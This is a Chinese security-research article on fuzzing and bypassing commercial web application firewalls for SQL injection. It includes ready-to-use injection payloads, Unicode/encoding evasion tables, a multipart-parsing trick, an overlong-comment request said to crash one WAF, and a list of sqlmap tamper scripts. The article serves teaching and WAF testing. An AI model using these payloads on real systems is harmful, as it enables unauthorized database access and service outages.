原文链接：[先知技术社区](https://xianzhi.aliyun.com/forum/read/349.html)

Author：Tr3jer_CongRong Blog：www.Thinkings.org Mail：Tr3jer@gmail.com

### 0x00 前言

去年到现在就一直有人希望我出一篇关于waf绕过的文章，我觉得这种老生常谈的话题也没什么可写的。很多人一遇到waf就发懵，不知如何是好，能搜到的各种姿势也是然并卵。但是积累姿势的过程也是迭代的，那么就有了此文，用来总结一些学习和培养突破waf的思想。可能总结的并不全，但目的并不是讲那些网上搜来一大把的东西，So…并不会告诉大家现有的姿势，而是突破Waf
Bypass思维定势达到独立去挖掘waf的设计缺陷和如何实现自动化的Waf Bypass（这里只讲主流waf的黑盒测试）

### 0x01 搞起

当我们遇到一个waf时，要确定是什么类型的？先来看看主流的这些waf，狗、盾、神、锁、宝、卫士等等。。。（在测试时不要只在官网测试，因为存在版本差异导致规则库并不一致）

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_9404c303c609e1f.jpg-w331s)

#### 1、云waf：

在配置云waf时（通常是CDN包含的waf），DNS需要解析到CDN的ip上去，在请求uri时，数据包就会先经过云waf进行检测，如果通过再将数据包流给主机。

#### 2、主机防护软件：

在主机上预先安装了这种防护软件，可用于扫描和保护主机（废话），和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。这里再插一嘴，mod_security、ngx-lua-waf这类开源waf虽然看起来不错，但是有个弱点就是升级的成本会高一些。

#### 3、硬件ips/ids防护、硬件waf（这里先不讲）

使用专门硬件防护设备的方式，当向主机请求时，会先将流量经过此设备进行流量清洗和拦截，如果通过再将数据包流给主机。

再来说明下某些潜规则（关系）：

  * 百度云加速免费版节点基于CloudFlare
  * 安全宝和百度云加速规则库相似
  * 创宇云安全和腾讯云安全规则库相似
  * 腾讯云安全和门神规则库相似
  * 硬件waf自身漏洞往往一大堆

当Rule相似时，会导致一个问题，就比如和双胞胎结婚晓得吧？嗯。

### 0x02 司空见惯

我们还需要把各种特性都记牢，在运用时加以变化会很有效果。

数据库特性：

  * 注释：

    
    
    #
    --    -- -    --+
    //
    /**/
    /*letmetest*/
    ;

利用注释简单绕过云锁的一个案例：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_0cea6b3a3fa2a73.png-w331s)

拦截的，但/ **/ > 1个就可以绕过了，也就是/**//**/以上都可以。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_ae542018a2dee6c.png-w331s)

  * 科学记数法：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_dd41786b0361705.png-w331s)

  * 空白字符：

    
    
    SQLite3 0A 0D 0C 09 20
    MySQL5 09 0A 0B 0C 0D A0 20
    PosgresSQL 0A 0D 0C 09 20
    Oracle 11g 00 0A 0D 0C 09 20
    MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20

  * +号： ![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_ea8efcbff832509.jpg-w331s)

  * -号： ![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_fa425a42fb5220f-2.jpg-w331s)

  * ``符号： ![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_e1664d9e5d4c90c-1.jpg-w331s)

  * ~号： ![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_d1d249990ef68ce.jpg-w331s)

  * !号：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_c67b7f6cd14e0f4.jpg-w331s)

  * @`形式`： ![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_c0038f3ac53df39.jpg-w331s)

  * 点号.1：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_e5f2c3a14448842.png-w331s)

  * 单引号双引号：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_1496c4d76caba6a.png-w331s)

  * 括号select(1)：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_88cd45e2c149866.jpg-w331s)

试试union(select)云盾会不会拦截

  * 花括号：

这里举一个云盾的案例，并附上当时fuzz的过程：

    
    
    union+select 拦截
    select+from 不拦截
    select+from+表名 拦截
    union(select) 不拦截
    所以可以不用在乎这个union了。
    union(select user from ddd) 拦截
    union(select%0aall) 不拦截
    union(select%0aall user from ddd) 拦截
    fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。
    union(select%0aall{user}from{ddd}) 不拦截。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_421442180cb47d4.png-w331s)

Bypass Payload：

    
    
    1 union(select%0aall{x users}from{x ddd})
    1 union(select%0adistinct{x users}from{x ddd})
    1 union(select%0adistinctrow{x users}from{x ddd})

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_604fb078ea79554.png-w331s)

可运用的sql函数&关键字：

    
    
    MySQL：
    union distinct
    union distinctrow
    procedure analyse()
    updatexml()
    extracavalue()
    exp()
    ceil()
    atan()
    sqrt()
    floor()
    ceiling()
    tan()
    rand()
    sign()
    greatest()
    字符串截取函数
    Mid(version(),1,1)
    Substr(version(),1,1)
    Substring(version(),1,1)
    Lpad(version(),1,1)
    Rpad(version(),1,1)
    Left(version(),1)
    reverse(right(reverse(version()),1)
    字符串连接函数
    concat(version(),'|',user());
    concat_ws('|',1,2,3)
    字符转换
    Char(49)
    Hex('a')
    Unhex(61)
    过滤了逗号
    (1)limit处的逗号：
    limit 1 offset 0
    (2)字符串截取处的逗号
    mid处的逗号：
    mid(version() from 1 for 1)
    MSSQL：
    IS_SRVROLEMEMBER()
    IS_MEMBER()
    HAS_DBACCESS()
    convert()
    col_name()
    object_id()
    is_srvrolemember()
    is_member()
    字符串截取函数
    Substring(@@version,1,1)
    Left(@@version,1)
    Right(@@version,1)
    (2)字符串转换函数
    Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
    Char('97')
    exec

Mysql BIGINT数据类型构造溢出型报错注入：BIGINT Overflow Error Based SQL Injection
http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html

容器特性：

  * %特性：

asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉，而没特殊要求的waf当然是不会的：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_abc73b71e9158e3.png-w331s)

修复方式应该就是检测这种百分号%的周围是否能拼凑成恶意的关键字吧。

  * %u特性：

iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf就不一定了：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_d48a41375f25fba.png-w331s)

修复过后：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_ea191e995406fcf.png-w331s)

这个特性还存在另一个case，就是多个widechar会有可能转换为同一个字符。

    
    
    s%u0065lect->select
    s%u00f0lect->select

WAF对%u0065会识别出这是e，组合成了select关键字，但有可能识别不出%u00f0

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_06c12602daca467.png-w331s)

其实不止这个，还有很多类似的：

    
    
    字母a：
    %u0000
    %u0041
    %u0061
    %u00aa
    %u00e2
    单引号：
    %u0027
    %u02b9
    %u02bc
    %u02c8
    %u2032
    %uff07
    %c0%27
    %c0%a7
    %e0%80%a7
    空白：
    %u0020
    %uff00
    %c0%20
    %c0%a0
    %e0%80%a0
    左括号(：
    %u0028
    %uff08
    %c0%28
    %c0%a8
    %e0%80%a8
    右括号)：
    %u0029
    %uff09
    %c0%29
    %c0%a9
    %e0%80%a9

  * 畸形协议&请求：

asp/asp.net： 还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对application/x-www-form-urlencoded提交数据方式进行过滤，就会导致任意注入。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_a906bb9182568bd.png-w331s)

php+Apache：

waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，当我们将协议随便定义时也是可以的：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_cf818911f2c0924.png-w331s)

PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解析器接受整个字符串。
因此，如果没有按正确规范的话，就会出现这么一个状况：首先填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。

    
    
    ------,xxxx
    Content-Disposition: form-data; name="img"; filename="img.gif"
    GIF89a
    ------    Content-Disposition: form-data; name="id"
    1' union select null,null,flag,null from flag limit 1 offset 1-- -    --------    ------,xxxx--
通用的特性：

  * HPP：

HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。
假设提交的参数即为：

`id=1&id=2&id=3`

    
    
    Asp.net + iis：id=1,2,3
    Asp + iis：id=1,2,3
    Php + apache：id=3

  * 双重编码：

这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。

    
    
    unlencode
    base64
    json
    binary
    querystring
    htmlencode
    unicode
    php serialize

  * 我们在整体测试一个waf时，可测试的点都有哪些？

GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。

#### 0x03 见招拆招

“正则逃逸大法”：或许大家没听说过这个名词，因为是我起的。我发现很多waf在进行过滤新姿势的时候很是一根筋，最简单的比方，过滤了%23%0a却不过滤%2d%2d%0a？上面提到八成的waf都被%23%0a所绕过。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_0115672f38fbad1.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_a4a7b92089b2847.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_cd1ef7b67de2e06.png-w331s)

科学计数法1union、1from？多次被坑的安全宝&百度云加速&Imperva：
![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_9c0379b2523e1b6.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_9df4d4ed0f2cfc3.png-w331s)

过滤了union+select+from，那我select+from+union呢？使用Mysql自定义变量的特性就可以实现，这里举一个阿里云盾的案例：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_4bd635407eb1a01.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_91909dc899a45de.png-w331s)

由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个点。/ _ddd_ /union/ _ddd_ /select 就可以了。
Bypass Payload：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_b501c682de4991f.png-w331s)

如何做到通过推理绕过waf？这里举一个腾讯云安全的案例：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_3f2cf66f61f2f82.png-w331s)

绕过思路: 首先看看腾讯云安全怎么检测sql注入的，怎么匹配关键字会被拦截，怎么匹配不会?

  * union+select拦截
  * select+from拦截
  * union+from不拦截

那么关键的点就是绕过这个select关键字

  * select all
  * select distinct
  * select distinctrow

既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普通的`/**/`这种代替空格，还是会被视为是union+select。select
all可以这么表达`/*!12345select all*/`，腾讯云早已识破这种烂大街的招式。尝试了下/ _!_ /中间也可以使用%0a换行。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_21217eee0b21e5e.png-w331s)

`*!12345%0aselect%20all*/`还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试`/*!12345select%0aall*/`，结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于union+12345selectall，
不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_c16f7be60820617.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_079a5da7ce78c7f.png-w331s)

可能会问，推理的依据并不能真正意义上证明忽略掉了%0a啊？当然要证明下啊，`/*!12345%0aselect%0aall*/`
就被拦截了，说明刚开始检测到12345%0aselect就不再检测后方的了，union+12345select就已经可以拦截掉了。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_7261186f34f96d2.png-w331s)

还可能会问，既然忽略掉了%0a，那么/ _!select%0aall_ /是不是也可以啊，然而并不行。合理的推理很有必要。

Bypass Payload:

    
    
    1' union/*!50000select%0aall*/username from users%23
    1' union/*!50000select%0adistinct*/username from users%23
    1' union/*!50000select%0adistinctrow*/username from users%23

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_c8ed256f18b265e.png-w331s)

不是绕不过狗，只是不够细心：

    
    
    union+select拦截。
    select+from拦截。
    union+from不拦截。
    fuzz了下/*!50000select*/这个5位数，前两位数<50 && 第二位!==0 && 后三位数==0即可bypass。(一点细节也不要放过。)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_bec0ad2a1a75b29.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_f605b75df3a04a2.png-w331s)

测试环境

    
    
    Windows Server 2008 + APACHE + PHP + Mysql Bypass Payload:
    1' union/*!23000select*/user,password from users%23

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_a7975228824131d.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_c4336f788e8a987.png-w331s)

这里证明一个观点：好姿势不是死的，零零碎碎玩不转的姿势巧妙的结合一下。所以说一个姿势被拦截不代表就少了一个姿势。

#### 0x04 别按套路出牌

云锁版本迭代导致的 & 360主机卫士一直存在的问题：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_bf2dcb8de6db8cd.jpg-w331s)

注意POST那个方向，waf在检测POST传输的数据过程中，没有进行URL的检测，也就是说waf会认为URL上的任何参数信息都是正常的。既然是POST请求，那就只检测请求正文咯。(神逻辑)

在标准HTTP处理流程中，只要后端有接收GET形式的查询字段，即使客户端用POST传输，查询字符串上满足查询条件时，是会进行处理的。（没毛病）

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_f5039fb4f79fc42.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_b2a887224aa58f4.png-w331s)

点睛之图:)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_b1b4d35c4ffe0dd.png-w331s)

当waf成了宕机的罪魁祸首是什么样的？举一个安全狗的案例：

    
    
    /*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/

注释中包含超长查询字符串，导致安全狗在识别的过程中挂掉了，连带着整个机器Service Unavailable：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_c31dc7578deb118.jpg-w331s)

再举一个云锁也是因为数据包过长导致绕过的案例：

云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示拦截了SQL注入

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_ce6771b24a87d31.png-w331s)

当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。？
![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_11e7a171b0ccb6d.png-w331s)

#### 0x05 猥琐很重要

这里讲个有意思的案例，并且是当时影响了安全宝、阿里云盾的姿势：

有次睡前想到的，emoji图标！是的，平时做梦并没有美女与野兽。当时只是随便一想，第二天问了5up3rc，他说他也想过，但测试并没有什么效果。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_4b7e77b8be1db3b.png-w331s)

emoji是一串unicode字集组成，一个emoji图标占5个字节，mysq也支持emoji的存储，在mysql下占四个字节:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_7cf7ad26d7c596d.png-w331s)

既然在查询的时候%23会忽略掉后面的，那么Emoji就可以插入到%23与%0A之间。再加多试了试，成功绕过了，200多个emoji图标，只能多，但少一个都不行。。。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_4ce3a2a9e859522.png-w331s)

可能会说，这是因为超⻓查询导致的绕过吧?并不是。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_b9ca972fbf4a347.png-w331s)

这么⻓，mysql也是会执行的:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_9e6c1c6a745dba6.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_b24bcd98408a624.png-w331s)

我们再来测试阿里云盾：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_0621527440ee8ce.png-w331s)

绕过了。。。事情还没看起来这么简单。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_69e39219128d42e.png-w331s)

当缩少emoji数量的话会拦截，想想还是再加多些试试:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_e07432fd7c0223e.png-w331s)

还是拦截，那刚才的没拦截是怎么回事?点根烟，逐一进行排查。发现能绕过的原因和emoji数量无关，而是某个emoji可以。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_fdd778d2306daf2.png-w331s)

就是这个愤怒的emoji，其他的emoji都不行。唯独愤怒脸可以:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_27dfdf52dae2d89.png-w331s)

将这些emoji进行urlencode看看特征，究竟是什么原因?看看哪些emoji插入不会被拦截:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_baa04579a8406f9.png-w331s)

有些emoji进行urlencode后是很⻓的，因为是几个emoji进行组合的。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_be459c14beb339d.png-w331s)

将这些payload进行注入进去。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_4c84e726e9ac7dd.png-w331s)

难道只有这个愤怒脸插入进去就可以绕过?也不能这么说，我发现能绕过的字符都是ascii码超过了127的字符：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_bad805652340353.png-w331s)

那为什么愤怒脸的emoji可以?这里提到emoji的特征，常⻅的emoji是四位组成，前三位多数是一致的，把这三位插入payload试试:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_8574247b002533b.png-w331s)

可以实现绕过，再来看看愤怒脸的urlencode:

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_1df235c4575549d.png-w331s)

最后一位是%a0，那么也就是说完全可以忽略掉最后一位，而多数emoji第四位是 < ascii 127的，所以达到绕过的只是 > ascii
127的字符，会导致waf引擎无法检测。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_e2ae4735e4e7464.png-w331s)

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_0a42bd57150c6d3.png-w331s)

我是个技术人，虽然这是异想天开没有任何根据的想法，但仍愿意去尝试。courage to try！

#### 0x06 自动化Bypass

首先总结下sqlmap的各种bypass waf tamper：

    
    
    apostrophemask.py 用UTF-8全角字符替换单引号字符
    apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
    appendnullbyte.py 在payload末尾添加空字符编码
    base64encode.py 对给定的payload全部字符使用Base64编码
    between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
    bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
    chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
    charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
    charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
    concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
    equaltolike.py 用“LIKE”运算符替换全部等于号“=”
    greatest.py 用“GREATEST”函数替换大于号“>”
    halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
    ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
    lowercase.py 用小写值替换每个关键字字符
    modsecurityversioned.py 用注释包围完整的查询
    modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
    multiplespaces.py 在SQL关键字周围添加多个空格
    nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
    overlongutf8.py 转换给定的payload当中的所有字符
    percentage.py 在每个字符之前添加一个百分号
    randomcase.py 随机转换每个关键字字符的大小写
    randomcomments.py 向SQL关键字中插入随机注释
    securesphere.py 添加经过特殊构造的字符串
    sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
    space2comment.py 用“/**/”替换空格符
    space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
    space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
    space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
    space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
    space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
    space2plus.py 用加号“+”替换空格符
    space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
    unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
    unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
    varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
    versionedkeywords.py 用MySQL注释包围每个非函数关键字
    versionedmorekeywords.py 用MySQL注释包围每个关键字
    xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF

看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。
鉴于多数waf产品是使用Rule进行防护，那么这里也不提什么高大上的机器学习。就是简单粗暴的fuzz。

提到系统的训练，鉴于多数waf产品是使用Rule进行防护，那么这里不说什么机器学习。来点简单粗暴有效果的修复方案：我把每个sql关键字比喻成“位”，将一个“位”的两边进行模糊插入各种符号，比如注释（#
— /**/）、逻辑运算符、算术运算符等等。

15年黄登在阿里云安全峰会提到的fuzz手法通过建立一个有毒标识模型，将将其插入到各种“位”，测试其waf。

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_93cf1802923c514.png-w331s)

在这基础上其实可以在更加全面的建立模型。因为我发现一个问题，常规绕过姿势都会被拦截。但是呢，稍加fuzz下其他“位”，做一些变通就又能绕过。最基本的一句注入语句就有这些位：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_1933afff84d7bf1.png-w331s)

最常见的四种sql注入语句：select、update、insert、delete

    
    
    有毒标识定义为n
    “位”左右插入有毒表示那么就是x的n次幂
    而且其他数据库也各有各的语法糖，次数量定义为y
    如果再将其编码转换定位为m
    其结果最少就得有：
    
    
    Factor[((x^n)*4 + x*y)*m]

通常waf引擎先转换m后再去匹配，这个还是要看场景。还有关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入，也就会需要fuzz更多的位。还没说特殊字符，根据系统含有特殊意义的字符等等，也要有所顾忌。

当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。 还有就是传输过程中可测试的点：

![](https://images.seebug.org/content/images/2017/02/thumb-Mon_1611-4_1241860009050136_60e832e4bc49cc9.png-w331s)

因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致waf不能识别或者是在满足特定条件下的欺骗了waf。

#### 0x07 End

一写起来就根本停不起来，后期决定出一系列waf绕过文，例如文件上传、webshell防御、权限提升等Waf绕过。xss的bypass就算了，防不胜防…（如果又想到什么有趣的手法的话，我会以下面回帖的方式给大家）

[wafbypass_sql.pdf下载](https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_sql.pdf)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/218/>

